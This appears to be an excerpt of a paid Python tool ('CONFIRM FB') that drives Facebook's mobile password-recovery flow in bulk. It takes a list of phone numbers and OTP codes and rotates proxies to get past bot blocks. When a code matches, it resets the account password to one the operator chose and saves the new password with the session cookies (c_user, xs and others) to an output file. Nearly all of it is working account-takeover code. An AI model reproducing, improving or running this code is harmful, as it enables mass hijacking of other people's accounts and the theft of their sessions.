...
def test_proxy(proxies, server_domain='m.facebook.com'):
    try:
...
def load_settings():
    try:
        with open('Confirm_Settings.json', 'r') as f:
            return json.load(f)
    except:
        return {}
...
def update_counter(status, number=None, message=None, color=None, html_content=None, otp=None):
    ...
    with counter_lock:
        if status == 'success':
            ...
            total_failed += 1
            save_output('Failed.txt', f"{number}|{otp if otp else 'N/A'}|{message}")
        elif status == 'error':
            total_error += 1
            save_output('Error.txt', f"{number}|{otp if otp else 'N/A'}|{message}")
            if html_content:
...
def save_unknown_page(number, source, html_content):
    if not os.path.exists('Unknown_Page_Logs'):
        os.makedirs('Unknown_Page_Logs')
    
    timestamp = int(time.time())
    filename = f"Unknown_Page_Logs/{number}_{source}_{timestamp}.html"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
    except Exception as e:
        safe_print(f"{RED} Failed to save unknown page log: {e}")

def save_output(filename, data):
    if not os.path.exists('Confirm Outputs'):
        os.makedirs('Confirm Outputs')
        
    filepath = f"Confirm Outputs/{filename}"
    try:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(data + '\n')
    except Exception as e:
        safe_print(f"{RED} Failed to save output: {e}")
...
def clear_logo():
    ...
    print(''.join([GREEN, "\n      .d8888.  db    db  d8888b. \n      88'  YP  `8b  d8'  88  `8D \n      `8bo.     `8bd8'   88oobY' \n        `Y8b.   .dPYb.   88`8b   \n      db   8D  .8P  Y8.  88 `88. \n      `8888Y'  YP    YP  88   YD   \n", LINE, '\n ', GREEN, '[', RED, '●', GREEN, '] TOOL OWNER   ', CYAN, ':', GREEN, ' @yeasin_hossain018\n ', GREEN, '[', RED, '●', GREEN, '] TOOL         ', CYAN, ':', GREEN, ' CONFIRM FB\n ', GREEN, '[', RED, '●', GREEN, '] TOOL STATUS  ', CYAN, ':', GREEN, ' PAID\n', LINE]))

def file_inp():
    clear_logo()
    print(f" {GREEN}UserName {EKL} {user_nm}\n {RED}Expired {EKL} {expr} (Utc)\n{LINE}")
    
    file_name = 'Confirm_Acc_List.txt'
    
    if not os.path.exists(file_name):
        print(f"{WHITE} '{file_name}' not found.")
        print(f"{WHITE} Please create '{file_name}' with 'Number|OTP' format.")
    ...
    for line in lines:
        if '|' in line:
            ...
            if len(parts) >= 2:
                ...
                otp = parts[1].strip()
                if number.isdigit() and otp.isdigit():
                    valid_entries.append(f"{number}|{otp}")

    if valid_entries:
        print(f"{GREEN} [{RED}●{GREEN}] Found {len(valid_entries)} Accounts in '{file_name}'")
        input(f"{WHITE} Press Enter to Start Confirming...")
        autom_main()
    else:
        print(f"{WHITE} '{file_name}' is empty or has invalid format (Number|OTP).")
        input(f"{WHITE} Press Enter to Exit...")
        sys.exit(0)
...
def autom_main():
    while True:
        clear_logo()
        try:
            with open('Confirm_Acc_List.txt', 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            ...
            if not entries:
                input(f"{WHITE} Add accounts to 'Confirm_Acc_List.txt' (Number|OTP) and press Enter...")
                continue
            break
        except Exception as e:
    ...
    print(f"{LINE}\n{WHITE} Setting up Password Proxy System...")
    PWD_PROXY_LIST = get_proxy_list('sms_proxy_settings', 'Password Proxy')
    PWD_PROXY_ITERATOR = itertools.cycle(PWD_PROXY_LIST) if PWD_PROXY_LIST else None
    
    if PWD_PROXY_LIST:
        print(f"{GREEN} [{RED}●{GREEN}] Total Password Proxies  {EKL} {len(PWD_PROXY_LIST)}")
    else:
        print(f"{YELLOW} No Password Proxy configured. Will continue with Main Proxy")
    ...
    pass_set = settings.get('password_settings', {})
    def_pass = pass_set.get('default_password', '')
    
    if def_pass:
        final_password = def_pass
        print(f"{GREEN} [{RED}●{GREEN}] Password {EKL} {final_password}")
    else:
        while True:
            p_inp = input(f"{GREEN} [{RED}●{GREEN}] Enter Password for Accounts {EKL} ").strip()
            if p_inp:
                final_password = p_inp
                break
            print(f"{RED} Password cannot be empty!")
    ...
    try:
        with threadpol(max_workers=maxworker) as executor:
            ...
            for number, otp in entries:
                ...
                future = executor.submit(check, number, otp, current_proxy, current_locale, browser_type, final_password, 0, server_domain, PWD_PROXY_ITERATOR)
                future.add_done_callback(lambda _: sem.release())
                
                if remaining_entries:
                    remaining_entries.pop(0)
                    with open('Confirm_Acc_List.txt', 'w', encoding='utf-8', errors='ignore') as f:
                        for n, o in remaining_entries:
                            f.write(f"{n}|{o}\n")
    except:
        maxworker = 30
    ...
    while True:
        try:
            choice = input(f"{WHITE} Press Enter to Start Again or Type 'E' to Exit {EKL} ")
...
def process_sms(session, resp_text, number, url, base_headers, otp, password, server_domain, pwd_proxy_iterator=None):
    if 'id="contact_point_selector_form"' in resp_text and 'name="recover_method"' in resp_text:
        ...
        if target_value:
            try:
                ...
                if 'action="/recover/code/' in sxr_respns.text or 'name="n"' in sxr_respns.text:
                    safe_print(f"{GREEN} [CONFIRM] SMS Sent Successfully {number}")
                    
                    lsd = re.search('name="lsd" value="(.*?)"', sxr_respns.text).group(1)
                    jazoest = re.search('name="jazoest" value="(.*?)"', sxr_respns.text).group(1)
                    
                    headers.update({
                        'content-type': 'application/x-www-form-urlencoded',
                        'referer': sxr_respns.url,
                        'sec-fetch-dest': 'document'
                    })
                    ...
                    otp_params = {
                        'ars': 'facebook_login',
                        'ph[0]': extracted_number if extracted_number else f"+{number}" if not number.startswith('+') else number,
                        'rm': 'send_sms',
                        'spc': '0',
                        'fl': 'default_recover',
                        'try': '1',
                    ...
                    sxr_respns = session.post(f"https://{server_domain}/recover/code/", params=otp_params, headers=headers, data=otp_data)
                    
                    if '/recover/password/' in sxr_respns.url or 'name="password_new"' in sxr_respns.text:
                        safe_print(f"{GREEN} [CONFIRM] OTP Matches! Proceeding to Password Reset...")
                        
                        headers.update({
                            'referer': f"https://{server_domain}/recover/code/"
                        })
                        
                        sxr_respns = session.get(sxr_respns.url, headers=headers)
                        save_unknown_page(number, 'importent_first_page', sxr_respns.text)
                        
                        if 'name="cur_pass"' in sxr_respns.text or 'name="password_new"' in sxr_respns.text:
                            if pwd_proxy_iterator:
                                try:
                                    proxy_data = next(pwd_proxy_iterator)
                                    session.proxies.update(proxy_data['proxy'])
                                    safe_print(f"{CYAN} Reloading Password Page...")
                                    ...
                                    reload_response = session.get(sxr_respns.url, headers=reload_headers)
                                    if reload_response.status_code == 200:
                                        sxr_respns = reload_response
                                    else:
                            ...
                            uid = number
                            url_uid_match = re.search(r'[?&]u=(\d+)', sxr_respns.url)
                            if url_uid_match:
                                uid = url_uid_match.group(1)
                            ...
                            timestamp = int(time.time())
                            new_pass = password
                            encpass = f"#PWD_BROWSER:0:{timestamp}:{new_pass}"
                            ...
                            pwd_params = {
                                ...
                                'fl': 'default_recover',
                                'c': '/login/',
                                'shown_session_invalidation_survey': '0',
                                'rm': 'send_sms'
                            }
                            ...
                            rx_pass = session.post(f"https://{server_domain}/recover/password/write/", params=pwd_params, headers=headers, data=pwd_data)
                            
                            if 'c_user' in session.cookies:
                                cookie_dict = session.cookies.get_dict()
                                priority = ['c_user', 'xs', 'fr', 'datr', 'sb', 'wd', 'm_pixel_ratio']
                                ordered = [f"{k}={cookie_dict[k]}" for k in priority if k in cookie_dict]
                                ordered += [f"{k}={v}" for k, v in cookie_dict.items() if k not in priority]
                                cookie_str = "; ".join(ordered)
                                
                                safe_print(f"{GREEN} [COOKIES] {cookie_str}")
                                update_counter('success', number, f"Password Reset Successfully {new_pass}", GREEN, otp=otp)
                                save_output('Success.txt', f"{uid}|{new_pass}|{cookie_str}")
                                return True
                            else:
                                save_unknown_page(number, 'URL_Text_Mismatch', rx_pass.text)
                                update_counter('failed', number, "Password Reset Failed - URL/Text Mismatch", RED, otp=otp)
                                return True
                        else:
                            save_unknown_page(number, 'Pwd_Page_Mismatch', sxr_respns.text)
                            update_counter('failed', number, "Password Page Mismatch (Check Debug)", RED, otp=otp)
                            return True
                    elif 'name="n"' in sxr_respns.text:
                        update_counter('failed', number, "OTP Incorrect - Mismatch", RED, otp=otp)
                        return True
                    elif 'name="action_proceed"' in sxr_respns.text:
                        update_counter('failed', number, "Captcha Required - Skipping...", RED, otp=otp)
                        return True
                    else:
                        save_unknown_page(number, 'Some_Error', sxr_respns.text)
                        update_counter('failed', number, "Some Error - Skipping...", RED, otp=otp)
                        return True

                if 'name="captcha_response"' in sxr_respns.text:
                    match = re.search(r'src="(https://m\.facebook\.com/captcha/tfbimage\.php\?.*?)"', sxr_respns.text)
                    if match:
                        captcha_img = match.group(1).replace('&amp;', '&')
                    update_counter('failed', number, "Captcha Found - Skipping...", PURPLE, otp=otp)
                    return True
                
                if '/r.php?next=' in sxr_respns.text:
                    # Should be recursive check but avoiding recursion depth issues
                    # If we reach here, usually it's a soft ban or reload needed
                    update_counter('failed', number, "Sorry, something went wrong - Skipping...", YELLOW, otp=otp)
                    return True

                save_unknown_page(number, 'Code_Sent_Failed', sxr_respns.text)
                update_counter('failed', number, "Code Sent Failed - Skipping...", RED, otp=otp)
                return True
            except:
                pass
        else:
            update_counter('failed', number, "SMS Option Not Found/Mismatch - Skipping...", YELLOW, otp=otp)
            return True
            
    return False

def check(number, otp, proxy=None, locale='en_US', browser_type='Brave', password=None, retry_count=0, server_domain='m.facebook.com', pwd_proxy_iterator=None):
    sxr_respns = None
    ...
    try:
        ...
        if 'id="login_identify_search_error_msg"' in sxr_respns.text:
            if retry_count < 3:
                check(number, otp, proxy, locale, browser_type, password, retry_count + 1, server_domain, pwd_proxy_iterator)
                return
            update_counter('failed', number, "Account Not Found", MAGENTA, otp=otp)
            return
            
        if 'action="/login/identify/?ctx=recover' in sxr_respns.text:
            update_counter('failed', number, "Multiple Account Found - Skipping...", GOLD, otp=otp)
            return
        ...
        if sxr_respns.url.startswith(f"https://{server_domain}/login/account_recovery/name_search/"):
            ...
            if 'action="/login/account_recovery/name_search/?flow=initiate_view' in sxr_respns.text:
                ...
                if process_sms(session, sxr_respns.text, number, sxr_respns.url, base_headers, otp, password, server_domain, pwd_proxy_iterator):
                    return

            update_counter('error', number, "Unknown Page (No Selector) - Skipping...", ORANGE, html_content=sxr_respns.text, otp=otp)
            return
            ...
            if 'id="contact_point_selector_form"' in sxr_respns.text:
                ...
                update_counter('error', number, "Unknown Page after try another way - Skipping...", ORANGE, html_content=sxr_respns.text, otp=otp)
                return
            ...
            if '/help/121104481304395' in sxr_respns.text or '/help/103873106370583' in sxr_respns.text:
                update_counter('failed', number, "Account Disabled - Skipping...", TOXIC, otp=otp)
                return
            ...
            update_counter('error', number, "Unknown Page (Device Based) - Skipping...", ORANGE, html_content=sxr_respns.text, otp=otp)
            return
        ...
        if 'window.MPageLoadClientMetrics' in sxr_respns.text:
             if retry_count < 3:
                check(number, otp, proxy, locale, browser_type, password, retry_count + 1, server_domain, pwd_proxy_iterator)
                return
             update_counter('error', number, "Unknown Page (Bot Block) - Skipping...", RED, html_content=sxr_respns.text, otp=otp)
             return
        ...
        update_counter('error', number, "Unknown Page - Skipping...", ORANGE, html_content=sxr_respns.text, otp=otp)
        ...
        update_counter('error', number, f"Network Error: {e}", RED, html_content=err_content, otp=otp)
        ...
        update_counter('error', number, f"Unexpected Error: {e}", RED, html_content=err_content, otp=otp)
